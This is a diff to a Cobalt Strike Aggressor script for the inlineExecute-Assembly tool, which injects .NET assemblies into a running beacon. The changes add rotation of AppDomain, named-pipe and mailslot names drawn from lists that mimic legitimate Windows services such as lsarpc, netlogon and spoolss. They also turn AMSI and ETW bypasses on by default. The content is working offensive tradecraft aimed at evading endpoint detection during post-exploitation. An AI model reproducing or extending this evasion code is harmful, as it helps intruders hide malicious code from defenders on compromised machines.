@@ -4,22 +4,121 @@ beacon_command_register(
 "Load CLR if not already loaded and inject .NET assembly into current beacon process. Avoids creating a new sacraficial process via fork and run technique", 
 "Synopsis: inlineExecute-Assembly --dotnetassembly /path/to/Assembly.exe --assemblyargs My Args To Pass --amsi --etw");
 
+
+global('$appDomainIndex $pipeNameIndex $mailSlotIndex');
+$appDomainIndex = 0;
+$pipeNameIndex = 0;
+$mailSlotIndex = 0;
+
+#
+# Arrays of plausible names
+#
+@appDomainOptions = @(
+    "MsEdgeDomain",
+    "LocalPolicy",
+    "HostEnvironment",
+    "System.Management.Automation",
+    "UserContext",
+    "WinLogonDomain",
+    "GlobalEnv",
+    "SessionEnv",
+    "PowerShellScriptDomain",
+    "NETRuntimeDomain",
+    "TaskSchedulerDomain",
+    "WinINETDomain",
+    "WindowsExplorerDomain",
+    "InstallUtilDomain",
+    "WMIManagementDomain"
+);
+
+@pipeNameOptions = @(
+    "spoolss", 
+    "wkssvc", 
+    "srvsvc",
+    "netlogon",
+    "lsarpc",
+    "browser",
+    "msrpc",
+    "sesssvc",
+    "atsvc",
+    "wkssvc02",
+    "termservice",
+    "ssh-lsa-pipe",
+    "globalrootpipe",
+    "iissvcsock",
+    "lsass_api"
+);
+
+@mailSlotNameOptions = @(
+    "Browser", 
+    "NETLOGON", 
+    "AppCmd",
+    "MailSlot1",
+    "MsRPC",
+    "LSARPC",
+    "SPOOLSS",
+    "LDAP",
+    "NTDSRep",
+    "LocalManageSlot",
+    "WMIServiceMail",
+    "DNSCacheMail",
+    "TaskHostMail",
+    "EdgeUpdateMail"
+);
+
+#
+# An alias for rotating each variable at any time
+#
+sub rotateLegitNames {
+    # Cycle appDomainOptions
+    $appDomain = @appDomainOptions[$appDomainIndex];
+    $appDomainIndex = ($appDomainIndex + 1) % size(@appDomainOptions);  # Wrap around to 0 if end is reached
+
+    # Cycle pipeNameOptions
+    $pipeName = @pipeNameOptions[$pipeNameIndex];
+    $pipeNameIndex = ($pipeNameIndex + 1) % size(@pipeNameOptions);
+
+    # Cycle mailSlotNameOptions
+    $mailSlotName = @mailSlotNameOptions[$mailSlotIndex];
+    $mailSlotIndex = ($mailSlotIndex + 1) % size(@mailSlotNameOptions);
+}
+
+
+#
+# Automatically call rotateLegitNames when this script loads
+#
+on script_load {
+    elog("[DEBUG] Checking rotateLegitNames...");
+    if (isdefined("rotateLegitNames")) {
+        elog("[DEBUG] rotateLegitNames is defined.");
+    } else {
+        elog("[ERROR] rotateLegitNames is NOT defined.");
+    }
+}
+
+#
+# Now your global defaults or other logic can use $appDomain, $pipeName, $mailSlotName
+#
+
 global('$etw $amsi $appDomain $version');
 
-#Global vars don't change
-$etw = 0;
+#Global vars don't change - $etw $amsi $mailSlot $entryPoint are set to always be on: 1. 
+$etw = 1;
 $revertETW = 0;
-$amsi = 0;
-$mailSlot = 0;
+$amsi = 1;
+$mailSlot = 1;
 $entryPoint = 1;
 
+#### Commented Out Section ####
 #Default values set here - if you don't want to use flags to change -> change here
-$appDomain = "totesLegit";
-$pipeName = "totesLegit";
-$mailSlotName = "totesLegit";
-
+#$appDomain = "totesLegit";
+#$pipeName = "totesLegit";
+#$mailSlotName = "totesLegit";
+####ENDOF Commented Out Section ####
 
 alias inlineExecute-Assembly {
+  #-------------------------------------- Rotate $appDomain, $pipeName, and $mailSlotName Arguments  --------------------------------------#
+    rotateLegitNames();
 
   #-------------------------------------- Extract/Parse Arguments  --------------------------------------#
     $data = substr($0, 23);
@@ -345,6 +444,24 @@ alias inlineExecute-Assembly {
     closef($fileHandle);
 
    #---------------------------------------------------------------------------------------------------------------------#
+
+  #-------------------------------------- Print all parameters set   --------------------------------------#
+
+    btask($1, "[inlineExecute-Assembly] about to run with arguments:");
+    btask($1, "  .NET assembly : $_dotNetAssembly");
+    btask($1, "  assembly args : $_assemblyWithArgs");
+    btask($1, "  appDomain     : $_appDomainArgs");
+    btask($1, "  pipeName      : $_pipeNameArgs");
+    btask($1, "  mailSlotName  : $_mailSlotNameArgs");
+    btask($1, "  amsi          : $_amsi");
+    btask($1, "  etw           : $_etw");
+    btask($1, "  revertETW     : $_revertETW");
+    btask($1, "  entryPoint    : $_entryPoint");
+    btask($1, "  mailSlot      : $_mailSlot");
+
+   #---------------------------------------------------------------------------------------------------------------------#
+
+
   
   #-------------------------------------- Package and ship it --------------------------------------#
 
@@ -352,7 +469,7 @@ alias inlineExecute-Assembly {
     $bofArgs = bof_pack($1, "ziiiiizzzib", $_appDomainArgs, $_amsi, $_etw, $_revertETW, $_mailSlot, $_entryPoint, $_mailSlotNameArgs, $_pipeNameArgs, $_assemblyWithArgs, $assemblyLength, $assemblyBytes);
 
     # announce what we're doing 
-    btask($1, "Running inlineExecute-Assembly by (@anthemtotheego)");
+    btask($1, "Running customized version of inlineExecute-Assembly by (@anthemtotheego)(@cyberchancer)");
 
     # execute it.
     beacon_inline_execute($1, $bof, "go", $bofArgs);
@@ -369,5 +486,3 @@ alias inlineExecute-Assembly {
   #------------------------------------------------------------------------------------------------------------------------------#
 
 }
-
-
